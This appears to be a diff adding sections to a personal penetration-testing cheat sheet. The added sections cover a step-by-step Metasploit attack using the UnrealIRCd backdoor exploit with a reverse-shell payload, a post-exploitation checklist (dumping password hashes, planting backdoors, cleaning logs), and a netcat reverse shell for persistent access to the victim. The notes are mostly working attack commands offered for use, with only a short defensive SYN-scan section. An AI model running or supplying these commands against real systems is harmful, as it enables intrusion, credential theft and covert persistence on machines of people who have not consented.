@@ -195,6 +195,11 @@ sudo wash -i wlan1mon	# Check if the target is using WPC - it not then it will n
 sudo aireplay-ng --fakeaut 0 -e "My Wifi name" -a 00:01:02:03:04:05 wlan1mon	# Begin injecting fake packets to router. If your device (wlan1mon) is not on the same channel as the router use `sudo iwconfig wlan1mon channel 1` where "1" would be the number of your router's channel.
 
 
+# BYPASSING HIDDEN WIFI / ESSID
+###############################
+# During the airmon-ng stage watch for networks that don't have a name but, instead, airmon specifies a "length". The "length" is not an accurate representation of password lengt.
+	# Example: <length:   9>
+
 
 # SYN SCAN DETECTION
 ####################
@@ -211,6 +216,109 @@ sudo aireplay-ng --fakeaut 0 -e "My Wifi name" -a 00:01:02:03:04:05 wlan1mon	# B
 		# If there are conversations after the "RST" packet is sent it may be suspicious
 # If numerous SYN packets are comming from the same MAC address / IP in a very short timeframe (miliseconds-ish) you're probably getting DoS/DDoS attacked
 	# But not always...
+
+
+# EXPLOITING VIA METASPLOIT
+###########################
+sudo service postgresql start	# Required dependency
+msfconsole	# Open Metasploit cli
+	# Use "?" for a help menu of commands
+	workspace	# This command, when run alone, shows all available workspaces
+	workspace -a MyWorkspace
+		# -a	# Adds a new workspace by the name "MyWorkspace" in this example
+	workspace MyWorkspace	# Switch to new workspace
+	search ircd	# Searches for the "ircd" exploit and displays basic data
+		# Copy the exploit name for use in further commands. Will look something like this:
+			#exploit/unix/irc/unreal_ircd_3281_backdoor
+	info exploit/unix/irc/unreal_ircd_3281_backdoor
+		# Provides info on a specific exploit
+	use exploit/unix/irc/unreal_ircd_3281_backdoor	# Instructe Metasploit to attack with a particular exploit
+		# Sub terminal may change again, indicating use of the named exploit
+		show options	# Show parameters that may be passed into the exploit
+			# This will show a series of option "NAMES". Use the below command, swapping out the names, to declare them.
+		set RHOSTS 192.168.0.108
+		show options	# When entered after using the `set` command you should see your entries in the "CURRENT SETTINGS" column
+		show payloads	# List all suitable payloads for this exploit
+		set payload cmd/unix/reverse	# Declare which payload you wish to deliver.
+			# "cmd/unix/reverse" was selected from the output of `show payloads`. This is a popular selection for opening shells on *nix devices
+		show options	# Show the options for the payload (different than from the full exploit)
+			# RHOST = "remote host"
+			# LHOST = "local host"
+		# In a new terminal run:
+			ifconfig	# to determine your local IP address.
+		set LHOST 192.168.0.109	# This should be you (the hacker's) local IP
+		exploit	# Run exploit with all configs provided
+			# The output for [the example exploit] should say something like "Command shell session 1 opened ..."
+			whoami	# Check if you're in the shell
+			pwd	# Check where you are in the victim's device
+
+
+# POST EXPLOIT
+##############
+# 1.	Quickly assess environment. What other apps are vulnerable? Any other ways in? Etc.
+# 2.	Locate and copy/modify critical files (passwords, credentials, upload backdoors, etc.)
+# 3.	Create new user accounts & anything needed to keep options open
+# 4.	Vertical escalation- capture admin or system-level credentials
+# 5.	Attack other systems. aka Horizontal escalation
+# 5.	Install backdoors & covert channels to keep privileges
+# 6.	Clean up after the attack (hide your trail). 
+			# Clean or flood logs 
+			# Check running defences for alerts
+
+# Use [Ctrl + Z] to put the root shell in the background and return to your device.
+sessions	# Display the session ID of the opened root sheel (will need for later)
+use post/linux/gather/hashdump
+show options
+set SESSION 1	# Set to the session number found in the `sessions` step
+exploit
+	# Copy the output from this command to a local text file
+use post/linux/gather/checkvm	# Determine if victim machine is VM or on hardware
+show options
+set SESSION 1	# Set to the session number found in the `sessions` step
+exploit
+	# Remember the output. It should specify if VM and what type.
+use post/linux/gather/enum_configs	# Hunt down critical configuration files on the victim system
+show options
+set SESSION 1	# Set to the session number found in the `sessions` step
+exploit
+	# This exploit should automatically save the data to your system (no need to save)
+	# The output lists files saved to your PC. Open them at will to read contents
+use post/linux/gather/enum_network	# Grab the network configs
+set SESSION 1	# Set to the session number found in the `sessions` step
+exploit
+	# Same sort of output as in last step
+use post/linux/gather/enum_protections	# Find out what types of defences the target system has
+set SESSION 1
+exploit
+use post/linux/gather/enum_system	# Grab data on users, installed packages, services, hardware, etc.
+set SESSION 1
+exploit
+use post/linux/gather/enum_users_history	# Grab all user history
+set SESSION 1
+exploit
+
+
+# ENSURE PERSISTENT CONNECTION
+##############################
+# BASED ON THE EXPLOITING VIA METASPLOIT AND POST EXPLOIT SECTIONS!!!!
+# Return to the target's root shell session
+nc -h	# Run the help option for the Netcat program to see if it's installed on the target
+	# This is used to bypass the firewall as the target will be connecting to you...not you connecting to the target.
+# ON ATTACKER MACHINE:
+	nc -lvp 4444	# Begin a "listener"
+		# -l	# Listen for an incoming connection rather than initiate a connection to a remote host
+		# -v	# Verbose output
+		# -p	# Source Port (4444 in this case)
+# BACK ON VICTIM MACHINE:
+	nc -vn 192.168.0.109 4444 -e /bin/bash
+		# -v	# Verbose output
+		# -n	# Do not do any DNS or service lookups
+		# 192.168.0.109	# IP address of the attacking machine
+		# 4444	# Port number specified in the listener (on the attacker's PC)
+		# -e	# Specify the file name to execute after connection is made (/bin/bash will open the shell)
+# The attackers terminal should now have a permanent connection with the target
+
+
 
 
 # BRUTE FORCE ATTACKING (telnet targets)
